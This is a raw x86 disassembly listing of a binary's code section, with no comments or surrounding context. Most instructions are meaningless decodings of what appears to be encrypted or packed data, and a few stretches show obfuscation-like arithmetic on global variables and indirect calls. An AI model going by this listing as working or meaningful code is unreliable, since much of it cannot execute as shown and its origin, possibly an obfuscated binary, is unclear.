  402b25:	in     eax,0x59
  402b27:	push   eax
  402b28:	ror    BYTE PTR [ecx+0x211dfd2f],1
  402b2e:	cs nop
  402b30:	pushf  
  402b31:	ror    esp,cl
  402b33:	cmp    al,0x2
  402b35:	out    0xde,al
  402b37:	add    eax,edx
  402b39:	sbb    esp,ebp
  402b3b:	and    eax,0xd5602e87
  402b40:	jle    0x402af1
  402b42:	repnz adc esp,ecx
  402b45:	add    BYTE PTR [edi],cl
  402b47:	mov    dh,0xb2
  402b49:	jp     0x402bab
  402b4b:	stos   BYTE PTR es:[edi],al
  402b4c:	mov    al,ds:0xbf57a757
  402b51:	shr    esi,0xdd
  402b54:	inc    eax
  402b55:	lea    esp,[ebx+esi*2]
  402b58:	jmp    0x1f4a:0xd0284369
  402b5f:	jmp    0x69e2f65f
  402b64:	cmp    DWORD PTR [esi],edx
  402b66:	xchg   esp,eax
  402b67:	xchg   BYTE PTR [ebp+0x68505193],ch
  402b6d:	fisttp WORD PTR ds:0x1d810000
  402b73:	push   edi
  402b74:	add    DWORD PTR [edx+0x0],0xffffffe0
  402b78:	inc    ecx
  402b79:	add    BYTE PTR [eax],al
  402b7b:	push   0x2d0f
  402b80:	call   0x422031
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x428243,0x0
  402b94:	mov    edx,DWORD PTR ds:0x428357
  402b9a:	mov    DWORD PTR ds:0x42814f,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x4281f3
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x4282cb,ebx
  402bb6:	cmp    DWORD PTR ds:0x428243,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428d44
  402bcc:	mov    edx,DWORD PTR ds:0x428253
  402bd2:	add    DWORD PTR ds:0x42822b,edx
  402bd8:	mov    DWORD PTR ds:0x4282cf,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x42820b
  402be8:	mov    edx,DWORD PTR ds:0x4282db
  402bee:	sbb    DWORD PTR ds:0x428267,edx
  402bf4:	mov    edx,DWORD PTR ds:0x428223
  402bfa:	xor    DWORD PTR ds:0x4282e7,edx
  402c00:	and    edx,DWORD PTR ds:0x4282bf
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x4281eb,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x428193
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x42821b,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x422548
  402c34:	or     DWORD PTR ds:0x428113,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x4282bb,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x42834f,0x42832b
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [ecx+ebx*1-0x7a],0xffffffcd
  402c79:	jo     0x402c31
  402c7b:	hlt    
  402c7c:	sbb    BYTE PTR [eax],bl
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    BYTE PTR [esi+0x7830dea8],bh
  402c87:	jecxz  0x402c14
  402c89:	push   0xffffffbf
  402c8b:	daa    
  402c8c:	in     eax,dx
  402c8d:	int    0x1e
  402c8f:	mov    bl,0x68
  402c91:	and    bl,cl
  402c93:	cmp    eax,0x2e400296
  402c98:	sbb    ebp,eax
  402c9a:	push   0x41c1cbe4
  402c9f:	ins    BYTE PTR es:[edi],dx
  402ca0:	in     al,dx
  402ca1:	adc    eax,0xfdd8bd24
  402ca6:	xor    eax,0x57d4f417
  402cab:	das    
  402cac:	in     eax,0xd
  402cae:	or     eax,0x6099fba7
  402cb3:	iret   
  402cb4:	cdq    
  402cb5:	fimul  DWORD PTR [edx]
  402cb7:	int3   
  402cb8:	jle    0x402c83
  402cba:	pop    ds
  402cbb:	dec    edx
  402cbc:	retf   0x5e21
  402cbf:	sub    dh,ah
  402cc1:	mov    ch,0xc1
  402cc3:	mov    ecx,0x3b909194
  402cc8:	sbb    BYTE PTR ds:0x76ea953a,0xd5
  402ccf:	(bad)  
  402cd0:	das    
  402cd1:	cs jle 0x402c66
  402cd4:	cli    
  402cd5:	mov    esi,0x3b683d56
  402cda:	fs push 0xd0a0f326
  402ce0:	inc    ecx
  402ce1:	out    dx,al
  402ce2:	inc    ebx
  402ce3:	rcl    DWORD PTR [ecx-0xf],1
  402ce6:	xchg   ecx,eax
  402ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ce8:	ins    DWORD PTR es:[edi],dx
  402ce9:	inc    ecx
  402cea:	mov    ecx,0x59b0c878
  402cef:	imul   edx,DWORD PTR [ebp+0x74],0xffffff8f
  402cf3:	mov    bl,0xe
  402cf5:	les    eax,FWORD PTR [eax]
  402cf7:	lea    esi,[edi+ecx*2]
  402cfa:	js     0x402cd4
  402cfc:	scas   eax,DWORD PTR es:[edi]
  402cfd:	ins    BYTE PTR es:[edi],dx
  402cfe:	adc    eax,0xdfe8739c
  402d03:	lea    esi,[ecx-0x16]
  402d06:	outs   dx,DWORD PTR ds:[esi]
  402d07:	inc    ecx
  402d08:	aas    
  402d09:	imul   eax,DWORD PTR [ecx-0x4f],0x2307fc9e
  402d10:	fisub  DWORD PTR [eax+eiz*1-0x55]
  402d14:	xor    DWORD PTR [eax-0x6a],ecx
  402d17:	sahf   
  402d18:	push   0xedf6cfb4
  402d1d:	or     ebp,0xffffffbe
  402d20:	sbb    BYTE PTR [edi-0x6905ba6b],al
  402d26:	aad    0x45
  402d28:	xchg   edi,eax
  402d29:	mov    ds:0x9683a241,eax
  402d2e:	jecxz  0x402d1f
  402d30:	pop    ebp
  402d31:	clc    
  402d32:	aaa    
  402d33:	sub    ebx,esp
  402d35:	mov    ecx,0xf8542f92
  402d3a:	ficomp DWORD PTR [ecx+0x50ec0486]
  402d40:	pushf  
  402d41:	call   0x9c70:0xa603f89
  402d48:	jbe    0x402d5a
  402d4a:	pop    es
  402d4b:	pop    esi
  402d4c:	sahf   
  402d4d:	lahf   
  402d4e:	fscale 
  402d50:	loopne 0x402d24
  402d52:	inc    ebp
  402d53:	mov    esp,0x2c1c4b00
  402d58:	adc    eax,0xf3f83f88
  402d5d:	call   0x158e:0xf528225b
  402d64:	adc    edx,DWORD PTR [edi+0x71]
  402d67:	jp     0x402d8f
  402d69:	push   cs
  402d6a:	inc    edi
  402d6b:	jb     0x402ddd
  402d6d:	aam    0xd3
  402d6f:	(bad)  
  402d70:	out    dx,al
  402d71:	icebp  
  402d72:	push   esp
  402d73:	clc    
  402d74:	fsubr  QWORD PTR [edi]
  402d76:	sahf   
  402d77:	in     al,0x42
  402d79:	fs sbb eax,0xde80d9a
  402d7f:	push   esp
  402d80:	mov    bl,0xf7
  402d82:	iret   
  402d83:	jl     0x402e01
  402d85:	xor    al,bh
  402d87:	cmp    bl,BYTE PTR [eax+ebx*2]
  402d8a:	sub    al,al
  402d8c:	scas   al,BYTE PTR es:[edi]
  402d8d:	push   ss
  402d8e:	iret   
  402d8f:	cmp    DWORD PTR [ebx+eax*4-0x3a2317a2],eax
  402d96:	out    dx,al
  402d97:	xor    DWORD PTR [ebp+0x5a],edx
  402d9a:	xchg   edx,eax
  402d9b:	dec    esp
  402d9c:	lods   eax,DWORD PTR ds:[esi]
  402d9d:	pop    ebx
  402d9e:	lock inc eax
  402da0:	adc    cl,BYTE PTR [edx-0xd2d6ab5]
  402da6:	das    
  402da7:	jge    0x402e22
  402da9:	fld    DWORD PTR [eax]
  402dab:	mov    dl,dh
  402dad:	push   ss
  402dae:	or     DWORD PTR [esi+0x3dfeb40a],0x4703dd47
  402db8:	addr16 add eax,0xa5f94012
  402dbe:	jl     0x402dca
  402dc0:	mov    al,0x95
  402dc2:	mov    WORD PTR [esi+0x59bcdcfb],?
  402dc8:	push   edx
  402dc9:	push   0xcff485a7
  402dce:	jno    0x402ddf
  402dd0:	dec    ebx
  402dd1:	push   ss
  402dd2:	or     eax,0x4ab279de
  402dd7:	mov    DWORD PTR [edi-0x2aacbe76],esi
  402ddd:	pop    ebp
  402dde:	lods   eax,DWORD PTR ds:[esi]
  402ddf:	adc    ebp,DWORD PTR [esi]
  402de1:	sbb    eax,0xa10c56de
  402de6:	sub    bl,BYTE PTR [edi-0x7]
  402de9:	or     eax,0x92fe0314
  402dee:	nop
  402def:	mov    esi,0xe173baec
  402df4:	xlat   BYTE PTR ds:[ebx]
  402df5:	stos   DWORD PTR es:[edi],eax
  402df6:	test   eax,0x53db5473
  402dfb:	xchg   edx,eax
  402dfc:	inc    edi
  402dfd:	iret   
  402dfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dff:	sar    DWORD PTR [ebx+edx*8],cl
  402e02:	(bad)  [ecx]
  402e04:	lods   al,BYTE PTR ds:[esi]
  402e05:	outs   dx,BYTE PTR ds:[esi]
  402e06:	mov    edi,0x26d3e747
  402e0b:	inc    esi
  402e0c:	add    dl,BYTE PTR [edi]
  402e0e:	mov    al,ds:0xe8afe151
  402e13:	inc    edx
  402e14:	fist   WORD PTR [esp+ecx*8-0x26]
  402e18:	mov    al,ds:0xfd27706e
  402e1d:	jle    0x402e91
  402e1f:	enter  0x8818,0x79
  402e23:	sub    al,0x31
  402e25:	jge    0x402dde
  402e27:	pop    edi
  402e28:	cmp    esi,ebx
  402e2a:	(bad)  
  402e2b:	aam    0xba
  402e2d:	sub    ecx,ecx
  402e2f:	fidiv  WORD PTR [ecx]
  402e31:	lock mov WORD PTR [esi+0x4b9ec63b],cs
  402e38:	pop    ebp
  402e39:	into   
  402e3a:	dec    esp
  402e3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e3c:	sbb    DWORD PTR ss:[ebp-0x2ca24f81],edi
  402e43:	dec    esi
  402e44:	xchg   DWORD PTR [ecx+0x767eda26],esp
  402e4a:	cdq    
  402e4b:	scas   al,BYTE PTR es:[edi]
  402e4c:	mov    ebp,0xd64d7f4a
  402e51:	pop    es
  402e52:	xchg   esi,eax
  402e53:	push   ss
  402e54:	mov    edi,0xea68bb87
  402e59:	test   edx,eax
  402e5b:	cmp    ecx,ecx
  402e5d:	and    al,0x83
  402e5f:	(bad)  
  402e60:	mov    gs,WORD PTR [edx+0x29]
  402e63:	push   es
  402e64:	out    dx,al
  402e65:	jne    0x402e1d
  402e67:	inc    esi
  402e68:	out    0xb5,al
  402e6a:	xor    DWORD PTR [ebp+0x55],ebx
  402e6d:	or     dl,BYTE PTR [edi]
  402e6f:	stos   DWORD PTR es:[edi],eax
  402e70:	mov    ecx,0x6c6ed296
  402e75:	bound  ebx,QWORD PTR [ecx+0x3a]
  402e78:	fwait
  402e79:	scas   eax,DWORD PTR es:[edi]
  402e7a:	fld    DWORD PTR [esi-0x2d]
  402e7d:	lahf   
  402e7e:	dec    ebp
  402e7f:	dec    ebp
  402e80:	or     DWORD PTR [esi],0xffffffa0
  402e83:	shr    BYTE PTR [edi],cl
  402e85:	pop    ebx
  402e86:	je     0x402edb
  402e88:	pop    ebp
  402e89:	stos   DWORD PTR es:[edi],eax
  402e8a:	lock xchg ebp,eax
  402e8c:	sub    al,0x90
  402e8e:	mov    bh,BYTE PTR [ecx-0x26a766f7]
  402e94:	stos   BYTE PTR es:[edi],al
  402e95:	into   
  402e96:	cmp    ch,BYTE PTR [edi]
  402e98:	inc    esi
  402e99:	or     BYTE PTR [ebp+0x23],dh
  402e9c:	mov    bh,0x9f
  402e9e:	pop    esp
  402e9f:	inc    ebx
  402ea0:	xchg   BYTE PTR ds:[ecx-0x49],cl
  402ea4:	jae    0x402e6b
  402ea6:	cmp    al,0xc0
  402ea8:	sub    bp,WORD PTR [esi+0x6bd0f223]
  402eaf:	icebp  
  402eb0:	xchg   ecx,eax
  402eb1:	cmp    BYTE PTR [ecx+0x31457906],cl
  402eb7:	shl    BYTE PTR [ecx+edi*4+0x2fa1c812],cl
  402ebe:	lods   eax,DWORD PTR ds:[esi]
  402ebf:	jnp    0x402eb3
  402ec1:	lahf   
  402ec2:	dec    ebp
  402ec3:	push   es
  402ec4:	xor    DWORD PTR [edi-0x33],ebp
  402ec7:	stos   BYTE PTR es:[edi],al
  402ec8:	fisub  WORD PTR [ebp+0x18]
  402ecb:	jmp    0xe7b1005c
  402ed0:	jne    0x402efe
  402ed2:	pop    edx
  402ed3:	fs mov dh,0xf2
  402ed6:	retf   
  402ed7:	pop    eax
  402ed8:	add    al,BYTE PTR [esi+0x46]
  402edb:	jne    0x402ec0
  402edd:	jmp    0x402f5a
  402edf:	mov    BYTE PTR [esi-0x1b],cl
  402ee2:	mov    ebx,0x65daab51
  402ee7:	mov    DWORD PTR [esi-0x46577d81],0xffc47850
  402ef1:	jecxz  0x402eaa
  402ef3:	xchg   esp,eax
  402ef4:	and    edx,DWORD PTR [edi+esi*2+0x79b842f3]
  402efb:	sub    DWORD PTR [ebp+0x1b],edi
  402efe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eff:	imul   esp,DWORD PTR [eax-0x7f],0xffffffbb
  402f03:	push   edi
  402f04:	push   esi
  402f05:	xchg   esp,eax
  402f06:	jae    0x402f33
  402f08:	addr16 push eax
  402f0a:	stos   DWORD PTR es:[edi],eax
  402f0b:	push   ss
  402f0c:	sbb    BYTE PTR [eax+0x51],bl
  402f0f:	pop    ecx
  402f10:	push   ds
  402f11:	test   bl,bl
  402f13:	mov    cl,0xdc
  402f15:	scas   al,BYTE PTR es:[edi]
  402f16:	out    0xb3,eax
  402f18:	lock test BYTE PTR [edx+0x7d7dd8f4],al
  402f1f:	sbb    ch,BYTE PTR [esi-0x21]
  402f22:	cmp    al,0x14
  402f24:	mov    ebp,0x1236fb1
  402f29:	ret    0xf6b1
  402f2c:	cdq    
  402f2d:	(bad)  
  402f2f:	lock jae 0x402ef9
  402f32:	sbb    al,0x5e
  402f34:	out    dx,al
  402f35:	jge    0x402faf
  402f37:	ds xchg esp,eax
  402f39:	nop
  402f3a:	aaa    
  402f3b:	xchg   ecx,eax
  402f3c:	jl     0x402f08
  402f3e:	pop    ds
  402f3f:	add    al,0x3
  402f41:	pop    eax
  402f42:	sbb    al,0xff
  402f44:	fucom  st(0)
  402f46:	fwait
  402f47:	and    ecx,DWORD PTR [edx+eax*8+0x14]
  402f4b:	adc    DWORD PTR [ebp+0x7545a5c6],edx
  402f51:	mov    esi,0x9180e44
  402f56:	or     BYTE PTR [eax-0x79df2b0],dh
  402f5c:	icebp  
  402f5d:	imul   esp,DWORD PTR [ebx+0x6202b04],0x48
  402f64:	or     ecx,DWORD PTR [ecx]
  402f66:	and    DWORD PTR [esi+0x4e0cff3d],eax
  402f6c:	dec    ebp
  402f6d:	in     eax,0xfa
  402f6f:	sbb    eax,0x59a45730
  402f74:	call   0x5669:0xf4f56de3
  402f7b:	dec    ebp
  402f7c:	out    dx,al
  402f7d:	lods   eax,DWORD PTR ds:[esi]
  402f7e:	xlat   BYTE PTR ds:[ebx]
  402f7f:	mov    eax,ds:0x939ebb93
  402f84:	cdq    
  402f85:	fldcw  WORD PTR [ecx+0x6e6dbaa]
  402f8b:	inc    eax
  402f8c:	fxch   st(2)
  402f8e:	push   es
  402f8f:	rcl    DWORD PTR [edi],cl
  402f91:	sbb    eax,0x5b0e93d0
  402f96:	inc    esi
  402f97:	outs   dx,DWORD PTR ds:[esi]
  402f98:	int3   
  402f99:	xchg   edx,eax
  402f9a:	cmp    DWORD PTR [eax+0x320fc3e5],edx
  402fa0:	adc    edi,ecx
  402fa2:	jo     0x402fbc
  402fa4:	dec    esi
  402fa5:	xor    ecx,DWORD PTR [edi+edi*1-0x778f0a7]
  402fac:	(bad)  
  402fad:	jmp    0x29576d92
  402fb2:	pop    ecx
  402fb3:	sub    eax,0xb814282d
  402fb8:	inc    edx
  402fb9:	sub    BYTE PTR ds:0xd8fb4ff2,cl
  402fbf:	test   eax,0x30f8410f
  402fc4:	mov    dh,0x25
  402fc6:	sub    esp,ebx
  402fc8:	mov    al,ds:0xf1ed8951
  402fcd:	(bad)  
  402fce:	sar    dh,1
  402fd0:	les    esi,FWORD PTR [edx+0x7583aa0f]
  402fd6:	xchg   esp,eax
  402fd7:	mov    ?,WORD PTR [edx]
  402fd9:	mov    bl,0xd6
  402fdb:	(bad)  [eax+ebp*4+0x450e3fb6]
  402fe2:	add    eax,0x4e3cb34e
  402fe7:	outs   dx,BYTE PTR ds:[esi]
  402fe8:	loopne 0x403059
  402fea:	jecxz  0x402f8e
  402fec:	mov    es,WORD PTR [esi+ecx*4]
  402fef:	test   al,0xb6
  402ff1:	sub    al,0xc5
  402ff3:	xchg   DWORD PTR [ebx*1+0x11c0c3a],edi
  402ffa:	aaa    
  402ffb:	mov    ebx,0x4a1d6e00
  403000:	push   ebp
  403001:	mov    ebx,0xe590e3ea
  403006:	cmp    al,0xe4
  403008:	jo     0x402fb8
  40300a:	jmp    0xc0ee0b9d
  40300f:	aas    
  403010:	loope  0x403022
  403012:	push   edx
  403013:	push   0x90367aee
  403018:	inc    edx
  403019:	pop    ebx
  40301a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40301b:	fist   WORD PTR [edx+eiz*1+0x95650d6]
  403022:	sbb    bh,BYTE PTR [edi+0x63]
  403025:	jmp    0x40302f
  403027:	pop    edi
  403028:	pop    es
  403029:	or     al,0x5b
  40302b:	lods   eax,DWORD PTR ds:[esi]
  40302c:	mov    eax,ds:0xe5c31653
  403031:	lods   eax,DWORD PTR ds:[esi]
  403032:	pop    ds
  403033:	lds    esp,FWORD PTR [esi]
  403035:	popf   
  403036:	sbb    BYTE PTR [ecx],bl
  403038:	push   eax
  403039:	retf   
  40303a:	cmp    al,0x13
  40303c:	push   edx
  40303d:	dec    ebx
  40303e:	pop    ss
  40303f:	push   ebx
  403040:	fwait
  403041:	mov    eax,DWORD PTR [edx+0x23]
  403044:	retf   0xc281
  403047:	arpl   WORD PTR [eax+eax*1],si
  40304a:	add    BYTE PTR [ebx-0x35f433ab],cl
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x42825b,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x42835f,0x0
  403071:	mov    DWORD PTR ds:0x428363,edx
  403077:	mov    DWORD PTR ds:0x4282ab,0x1413
  403081:	mov    edx,DWORD PTR ds:0x428353
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x42811f,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x42835f,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428d64
  4030b1:	mov    DWORD PTR ds:0x42820b,0x4e29
  4030bb:	inc    DWORD PTR ds:0x42822f
  4030c1:	or     edx,DWORD PTR ds:0x4282cb
  4030c7:	add    edx,DWORD PTR ds:0x42814f
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x428357,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x4282df
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x428343
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x428363,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x42811b
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x428367,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x4030cb
  403121:	pop    ebx
  403122:	(bad)  
  403123:	jl     0x403162
  403125:	in     al,dx
  403126:	sbb    BYTE PTR [eax],bl
  403128:	sahf   
  403129:	adc    bl,BYTE PTR [eax]
  40312b:	sbb    BYTE PTR [edi],dh
  40312d:	pop    eax
  40312e:	shl    al,cl
  403130:	adc    dl,cl
  403132:	ret    
  403133:	pop    ebp
  403134:	mov    DWORD PTR [eax+0x5acb94c4],ecx
  40313a:	cld    
  40313b:	loop   0x4030dd
  40313d:	mov    ds:0x4982ec9f,eax
  403142:	shl    DWORD PTR [edx-0x27c31fe5],0xb6
  403149:	imul   BYTE PTR [eax-0x63]
  40314c:	sbb    ecx,0xffffffac
  40314f:	push   esp
  403150:	dec    ecx
  403151:	xor    eax,0xa845ee38
  403156:	pop    ds
  403157:	sbb    eax,0xf8a79223
  40315c:	(bad)  
  40315d:	stc    
  40315e:	aas    
  40315f:	cs cmp eax,0xdee350e5
  403165:	in     al,dx
  403166:	daa    
  403167:	idiv   BYTE PTR [ebp+edi*4-0x37]
  40316b:	inc    ecx
  40316c:	cmp    dl,BYTE PTR [eax+0x58]
  40316f:	sbb    bh,bl
  403171:	std    
  403172:	ret    
  403173:	fucom  st(3)
  403175:	xchg   esi,eax
  403176:	loopne 0x403169
  403178:	pop    edi
  403179:	adc    DWORD PTR [ecx-0x313a66b6],0x41
  403180:	xlat   BYTE PTR ds:[ebx]
  403181:	pop    ecx
  403182:	pop    edi
  403183:	jg     0x4031d1
  403185:	and    cl,BYTE PTR [edi+esi*1-0xe5b4895]
  40318c:	repnz pop edi
  40318e:	jmp    0x4031da
  403190:	pop    ecx
  403191:	pop    ss
  403192:	pop    esi
  403193:	mov    edx,0xb30923bb
  403198:	mov    ah,0xff
  40319a:	xor    DWORD PTR [ecx-0x18],esi
  40319d:	addr16 call 0x7cdbc6d
  4031a3:	mov    esp,0x1194ebb3
  4031a8:	nop
  4031a9:	pop    esp
  4031aa:	jmp    0x62b5abd1
  4031af:	retf   0xc5fe
  4031b2:	cmp    dl,BYTE PTR [edx-0x46]
  4031b5:	mov    bl,0x59
  4031b7:	test   BYTE PTR [ebx-0x1da91455],ch
  4031bd:	fild   WORD PTR cs:[eax]
  4031c0:	lahf   
  4031c1:	jle    0x403236
  4031c3:	push   ds
  4031c4:	sub    eax,0xfae78f9a
  4031c9:	adc    eax,0x9f1277aa
  4031ce:	xor    BYTE PTR [esi-0x49c8585],ch
  4031d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031d5:	mov    eax,0x5f189c59
  4031da:	xor    BYTE PTR [ecx+ebp*4],dl
  4031dd:	or     bh,BYTE PTR [ecx]
  4031df:	jb     0x4031a3
  4031e1:	add    DWORD PTR [edx-0x51],esi
  4031e4:	jl     0x403234
  4031e6:	push   ds
  4031e7:	mov    cl,0x11
  4031e9:	out    dx,al
  4031ea:	icebp  
  4031eb:	push   eax
  4031ec:	mov    esp,0xe1266549
  4031f1:	int    0xc0
  4031f3:	jnp    0x40319c
  4031f5:	ds jmp 0x403250
  4031f8:	inc    esi
  4031f9:	jo     0x403263
  4031fb:	(bad)  
  4031fc:	rol    BYTE PTR [ebp-0x622d1127],1
  403202:	ja     0x4031c4
  403204:	mov    eax,ds:0xfed99d93
  403209:	pusha  
  40320a:	pusha  
  40320b:	jle    0x40326e
  40320d:	inc    BYTE PTR [eax+0x141aca98]
  403213:	add    ebp,0x9f28b845
  403219:	or     al,0xd
  40321b:	bound  edi,QWORD PTR [ebx]
  40321d:	stc    
  40321e:	pop    edi
  40321f:	pop    ss
  403220:	lahf   
  403221:	push   ecx
  403222:	fcomp  DWORD PTR [eax]
  403224:	jb     0x40321a
  403226:	xchg   esp,eax
  403227:	(bad)  
  403228:	stos   DWORD PTR es:[edi],eax
  403229:	lods   al,BYTE PTR ds:[esi]
  40322a:	add    ecx,ebp
  40322c:	pop    eax
  40322d:	ins    DWORD PTR es:[edi],dx
  40322e:	loope  0x403290
  403230:	jb     0x403257
  403232:	pop    ebp
  403233:	cmp    esp,DWORD PTR [edx+0x716a5a15]
  403239:	pop    edi
  40323a:	xor    eax,0x5b83bfd1
  40323f:	jmp    0x403225
  403241:	add    BYTE PTR [ecx],ch
  403243:	or     esp,DWORD PTR [edx]
  403245:	sub    al,BYTE PTR [esi+0x650a7171]
  40324b:	loopne 0x403286
  40324d:	fcomp  DWORD PTR [edx+edi*1]
  403250:	pop    edx
  403251:	ror    DWORD PTR [eax+0x14e145b5],1
  403257:	mov    ebp,0x4b7d8510
  40325c:	and    ah,BYTE PTR ds:0xdebde47b
  403262:	add    BYTE PTR [esi+0x6c],cl
  403265:	hlt    
  403266:	shl    DWORD PTR [ebx+0x7b040e1],1
  40326c:	jl     0x40326d
  40326e:	scas   eax,DWORD PTR es:[edi]
  40326f:	arpl   WORD PTR [ebx-0x11],ax
  403272:	stc    
  403273:	test   eax,0x84bac61
  403278:	ds push edx
  40327a:	xor    ebp,0x4a4c947d
  403280:	jle    0x40327f
  403282:	pushf  
  403283:	mov    esp,DWORD PTR [edi+0x19]
  403286:	sar    WORD PTR [eax+0x46fb9fc5],cl
  40328d:	mov    esp,DWORD PTR [ecx-0x2ad3a3cc]
  403293:	add    eax,0x56dec065
  403298:	aad    0x87
  40329a:	mov    dl,0x28
  40329c:	mov    BYTE PTR [esp+edi*2-0x77],dh
  4032a0:	fldenv [ecx-0x545622a9]
  4032a6:	fs stos BYTE PTR es:[edi],al
  4032a8:	and    edi,0x47b3d461
  4032ae:	imul   edx,edi,0x4f84971c
  4032b4:	cmp    dl,dh
  4032b6:	mov    eax,0x7cf4e1dd
  4032bb:	addr16 xchg ebx,eax
  4032bd:	lock xor al,BYTE PTR [edx+0x7601952]
  4032c4:	xchg   esi,eax
  4032c5:	mov    ecx,0x29a80149
  4032ca:	xchg   ecx,eax
  4032cb:	popf   
  4032cc:	xor    ebx,DWORD PTR [edx+ebx*4]
  4032cf:	ret    0x4d2b
  4032d2:	aam    0x69
  4032d4:	jo     0x4032c3
  4032d6:	and    edi,ebp
  4032d8:	test   eax,0xa239596b
  4032dd:	sub    eax,ebx
  4032df:	xchg   ebp,eax
  4032e0:	adc    DWORD PTR [esi+0x0],eax
  4032e3:	sub    BYTE PTR [ebx+0x17],al
  4032e6:	add    ch,ah
  4032e8:	leave  
  4032e9:	sbb    ecx,DWORD PTR [ebp-0x29c03ca0]
  4032ef:	ins    BYTE PTR es:[edi],dx
  4032f0:	pop    ss
  4032f1:	inc    DWORD PTR fs:[ebp-0x2]
  4032f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032f6:	popf   
  4032f7:	mov    DWORD PTR ss:[eax+ecx*8+0x36],0x4a069c78
  403300:	pushf  
  403301:	push   ds
  403302:	and    eax,0x95addb9b
  403307:	mov    gs,WORD PTR [edi+0x5e8f9cfd]
  40330d:	aas    
  40330e:	std    
  40330f:	jmp    0x40334a
  403311:	stc    
  403312:	les    edi,FWORD PTR [eax-0x55f3a9a5]
  403318:	dec    ebp
  403319:	jmp    0xadf55c31
  40331e:	inc    eax
  40331f:	call   0x1019:0x3fe52cf4
  403326:	pop    es
  403327:	mov    esi,0xcd8249ac
  40332c:	xchg   edi,eax
  40332d:	mov    al,ds:0xeb51cbea
  403332:	cmp    al,0x4b
  403334:	dec    edi
  403335:	int3   
  403336:	loopne 0x40330e
  403338:	mov    bl,0xf7
  40333a:	es pop ebx
  40333c:	cwde   
  40333d:	adc    DWORD PTR [esi-0x59b034f4],eax
  403343:	xchg   ebx,eax
  403344:	jnp    0x403344
  403346:	mov    bl,BYTE PTR [ecx]
  403348:	popf   
  403349:	(bad)  
  40334a:	into   
  40334b:	pop    ss
  40334c:	adc    dh,BYTE PTR [edx]
  40334e:	iret   
  40334f:	cmp    eax,0x169cc7b8
  403354:	in     al,dx
  403355:	pop    es
  403356:	push   esp
  403357:	xor    eax,0x12533e8a
  40335c:	cld    
  40335d:	add    al,0x45
  40335f:	sbb    al,0xff
  403361:	push   ds
  403362:	imul   edi,DWORD PTR [edi+0x6409dea],0xbc3b8404
  40336c:	ror    BYTE PTR [edi],cl
  40336e:	xchg   ebp,eax
  40336f:	add    eax,DWORD PTR [edx]
  403371:	mov    ah,dh
  403373:	pop    ecx
  403374:	mov    ah,0x1c
  403376:	xor    BYTE PTR [eax],ch
  403378:	push   0x294ea9b6
  40337d:	mov    esi,0xaa74e874
  403382:	mov    cl,0xc4
  403384:	popa   
  403385:	arpl   dx,sp
  403387:	mov    edi,0x53931e7a
  40338c:	dec    edi
  40338d:	lahf   
  40338e:	sahf   
  40338f:	push   ss
  403390:	push   ecx
  403391:	stos   DWORD PTR es:[edi],eax
  403392:	lods   eax,DWORD PTR ds:[esi]
  403393:	bound  esi,QWORD PTR [esi]
  403395:	ja     0x4033cf
  403397:	pop    esp
  403398:	or     dl,al
  40339a:	push   esi
  40339b:	scas   eax,DWORD PTR es:[edi]
  40339c:	jnp    0x4033cd
